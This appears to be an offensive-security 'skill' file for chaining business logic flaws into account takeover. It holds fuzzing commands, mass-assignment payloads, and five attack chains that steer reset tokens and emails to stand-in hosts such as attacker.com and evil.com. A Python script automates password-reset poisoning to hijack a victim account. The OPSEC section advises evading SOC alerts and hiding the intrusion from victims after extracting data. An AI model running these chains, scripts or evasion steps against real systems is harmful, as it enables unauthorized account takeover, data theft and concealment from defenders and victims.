---
name: business-logic-ato
description: Chain business logic flaws → account takeover — password reset manipulation, parameter tampering, privilege escalation, and multi-step workflow abuse for ATO
version: 1.0.0
phase: chains
category: chain
tags: [chain, business-logic, ato, workflow]
tools: [curl, burp, python3, ffuf]
difficulty: advanced
opsec_level: medium
time_estimate: 3-8h
severity_if_found: critical
mitre_attack:
  - T1525
  - T1535
---

## When to Use

Use this skill when you've identified that an application has custom business logic in user management, authentication, or authorization workflows that deviates from standard frameworks. Chainable with IDOR, mass assignment, Host header injection, and CSRF findings to escalate to full account takeover (ATO).

**Do NOT** use for standard credential stuffing or password spraying — this is about logical flaws, not brute-force.

## What It Does

Maps the entire user management workflow (registration, login, password reset, email change, profile update, role/privilege assignment), identifies parameter tampering opportunities in multi-step transactions, chains business logic flaws to bypass authentication controls, and escalates to account takeover — including admin-level access.

## Methodology

### Phase 1: Workflow Reconnaissance

Map every user management endpoint. Run with Burp or ffuf + manual exploration:

```bash
# Discover user management endpoints via ffuf
ffuf -u https://target.com/api/FUZZ \
  -w user-management-endpoints.txt \
  -ac

# Common endpoints to check:
# /api/users, /api/account, /api/profile, /api/auth
# /forgot-password, /reset-password, /change-email
# /api/roles, /api/permissions, /api/admin/users
```

**Create a workflow map for each flow:**

| Flow | Steps | Input Points | State |
|------|-------|-------------|-------|
| Registration | 1. POST /register {email,pass} 2. Email verify 3. Profile setup | JSON body, email link | Multi-step |
| Login | 1. POST /login 2. JWT/cookie set 3. 2FA if enabled | Body, headers | Simple |
| Password Reset | 1. POST /forgot 2. Email with token 3. POST /reset?token=X | Token, new password | Multi-step |
| Email Change | 1. POST /change-email 2. Email verify (old) 3. Email verify (new) | Email param, token | Multi-step |
| Profile Update | 1. PUT /profile {fields} | Role, permissions, status | Single-step |

### Phase 2: Parameter Tampering Enumeration

For each step in a multi-step flow, test:
- Can you skip intermediate steps?
- Can you replay an old step with modified parameters?
- Can you tamper with parameters the application should set server-side?

**Password reset token manipulation:**

```bash
# Test 1: Is the token predictable?
# Token pattern analysis
# If base64: decode and check timestamp + user ID
# If numeric: brute-force with ffuf
ffuf -u https://target.com/reset?token=FUZZ \
  -w numbers.txt \
  -mr "password" \
  -ac

# Test 2: Can you supply your own token?
# POST /reset?token=attacker-controlled
# Then use attacker's token to reset victim's password

# Test 3: Token leak in response header or body?
# Some apps return the token in the reset link email response
curl -v -X POST https://target.com/forgot \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com"}'
# Check Location header, response body, Set-Cookie
```

**Email verification bypass:**

```bash
# Test 1: Can you change email without verifying the old one?
# Step 1: POST /change-email {"new_email": "attacker@evil.com"}
# Step 2: check verification code via email (skip this)
# If the app doesn't verify the old email first, you just changed it

# Test 2: Parameter pollution
# POST /change-email {"email": "victim@target.com", "email": "attacker@evil.com"}
# PHP or proxy may use the second value

# Test 3: JSON type confusion
# POST /change-email {"email_verified": true, "email": "attacker@evil.com"}
# Boolean at the field name the app checks
```

**Mass assignment / role upgrade:**

```bash
# Test: Can you set role during registration or profile update?
# POST /register {"email":"test@test.com","password":"Test123!","role":"admin"}
# PUT /profile {"role":"admin"}
# PATCH /users {"is_admin": true}

# Common privileged fields to probe:
# role, is_admin, is_verified, email_verified, is_active,
# account_type, permission_level, group_id, organization_id
```

### Phase 3: Chaining (The Critical Step)

A single business logic flaw is usually medium severity. The chain is what makes it critical.

**Chain 1: Password Reset Poisoning → IDOR → Admin ATO**

```
Step 1: Find Host header injection in password reset (reset email includes attacker-controlled host)
Step 2: POST /forgot with Host: attacker.com → victim gets email with token link:
        "https://attacker.com/reset?token=abc123"
Step 3: Attacker hosts https://attacker.com/reset → receives token in Referer or log
Step 4: Attacker uses token to reset victim's password
Step 5: Login as victim = ATO
```

**Chain 2: Role Tampering + Mass Assignment → Privilege Escalation → Full Access**

```
Step 1: Register user, get JWT with "role":"user"
Step 2: Intercept profile update, add "role":"admin" — if the endpoint updates User
        records directly without authorization check, role changes
Step 3: Login with modified role → access admin endpoints
Step 4: Create API key as admin → persistent access
```

**Chain 3: OAuth CSRF + State Validation Bypass → Victim Account Linking**

```
Step 1: Start OAuth flow to link your social account to target app
Step 2: Intercept the OAuth callback, capture the authorization code/link token
Step 3: Force victim to visit your crafted link (uses social engineering)
Step 4: Victim's session links attacker's social account to victim's account
Step 5: Login via social → access victim's account
```

**Chain 4: Email Change Race → No-old-email-verification → Password Reset**

```
Step 1: POST /change-email {"email":"attacker@evil.com"} — 
        if app skips verifying old email, you just changed victim's email
Step 2: POST /forgot — password reset goes to attacker@evil.com
Step 3: Reset password from attacker's inbox
Step 4: Login as victim
```

**Chain 5: 2FA Misconfiguration → Session Not Invalidated → Full ATO**

```
Step 1: Login as victim (stolen creds or previous step)
Step 2: Hit 2FA challenge page
Step 3: Check if there is a "remember this device" token or trusted device flow
Step 4: Can you call POST /2fa/skip? Or does a mobile app bypass 2FA?
Step 5: If session token is set BEFORE 2FA completes, skip the 2FA step entirely
```

### Phase 4: Exploitation Script Template

```python
#!/usr/bin/env python3
"""Business logic ATO chain: password reset poisoning -> token theft -> ATO"""

import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://target.com"
VICTIM_EMAIL = sys.argv[2] if len(sys.argv) > 2 else "victim@target.com"
ATTACKER_HOST = sys.argv[3] if len(sys.argv) > 3 else "attacker.com"

session = requests.Session()

# Step 1: Trigger password reset with Host header injection
print(f"[+] Triggering password reset for {VICTIM_EMAIL}")
resp = session.post(
    f"{TARGET}/forgot",
    json={"email": VICTIM_EMAIL},
    headers={"Host": ATTACKER_HOST, "X-Forwarded-Host": ATTACKER_HOST}
)
print(f"[+] Reset triggered. Check {ATTACKER_HOST} for incoming token")

# Step 2: Attacker-side — receive token (simulated; real attack uses listener)
token = input("[?] Paste the captured token: ").strip()

# Step 3: Reset password
NEW_PASS = "Hacked!2024!"
print(f"[+] Resetting password with token: {token}")
resp = session.post(
    f"{TARGET}/reset",
    json={"token": token, "password": NEW_PASS, "confirm": NEW_PASS}
)
assert resp.status_code == 200, f"Reset failed: {resp.status_code}"

# Step 4: Login as victim
print(f"[+] Logging in as {VICTIM_EMAIL}:{NEW_PASS}")
resp = session.post(f"{TARGET}/login", json={"email": VICTIM_EMAIL, "password": NEW_PASS})
jwt_token = resp.cookies.get("session") or resp.json().get("token")
print(f"[+] ATO successful! JWT: {jwt_token[:50]}...")
```

## Detection & OPSEC

**Detection by SOC:**
- Password reset requests for multiple users from same IP (correlation alert)
- Login from new geolocation immediately after password reset (impossible travel)
- Suspicious JWT claims (e.g., `role:admin` for a newly registered user)
- Host header anomalies logged in SIEM for password reset endpoints
- Multiple rapid email changes on same account

**OPSEC:**
- Use VPN/proxies close to the target's geography
- Space out password reset attempts (2-3/hour max to avoid velocity alerts)
- After ATO, change profile picture, avatar, or non-critical fields to blend in
- Don't change the password immediately if session hijack is sufficient
- If you must reset the password, restore it after extracting the data you need
- Clear any "trusted devices" or "remembered sessions" the victim may see
- Use the victim's account passively first (read data) before making changes

## References

- OWASP Web Security Testing Guide: Business Logic: https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/10-Business_Logic_Testing/
- OWASP Mass Assignment: https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
- PortSwigger Business Logic Vulnerabilities: https://portswigger.net/web-security/logic-flaws
- Password Reset Poisoning: https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning
- OAuth Account Hijacking via State: https://portswigger.net/web-security/oauth
